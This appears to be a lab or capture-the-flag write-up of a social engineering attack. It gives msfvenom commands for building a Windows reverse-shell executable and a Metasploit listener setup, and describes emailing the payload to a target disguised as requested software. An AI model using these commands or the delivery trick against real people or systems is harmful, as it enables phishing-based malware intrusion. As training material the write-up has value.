# Social Engineering Attack: Malicious Executable Delivery

## Overview

This writeup details a successful social engineering attack where we leveraged access to an email portal to deliver a malicious executable to the target. By responding to a legitimate software request with a weaponized executable, we were able to establish a reverse shell connection to the target system.

## Tools Used

- Metasploit Framework
- msfvenom (payload generation)
- msfconsole (handler for reverse shell)
- Email client

## Attack Methodology

### 1. Initial Access and Reconnaissance

- Gained access to the target's email portal using provided credentials
- Performed reconnaissance by examining the inbox contents
- Identified a critical email where the target was requesting an installer for software in .exe format for Windows x64

### 2. Payload Creation

Based on the target's request, we crafted a malicious executable:

- Used msfvenom to generate a malicious Windows executable with a TCP reverse shell payload
  ```
  msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f exe > softwarename.exe
  ```
- Initially attempted to create a meterpreter payload, but observed it would close immediately after execution
- Opted for a standard TCP reverse shell for better stability

### 3. Listener Configuration

- Set up a listener on the attacking machine to receive the incoming connection:
  ```
  use multi/handler
  set payload windows/shell_reverse_tcp
  set LHOST <attacker_ip>
  set LPORT <port>
  exploit -j
  ```

### 4. Payload Delivery

- Carefully renamed the malicious executable to match the requested software name
- Composed a reply email to the target with the malicious executable attached
- Ensured the email appeared legitimate and matched the expected software request

### 5. Command and Control

- Monitored the listener for incoming connections
- Successfully received a reverse shell connection when the target executed the malicious file
- Established command and control over the target system

## Conclusion

This attack demonstrates the effectiveness of social engineering when combined with technical exploitation. By responding to a legitimate request with a malicious file, we were able to bypass the human security layer and gain access to the target system. The key success factors were identifying the legitimate software request and crafting a convincing response that appeared to fulfill that request.
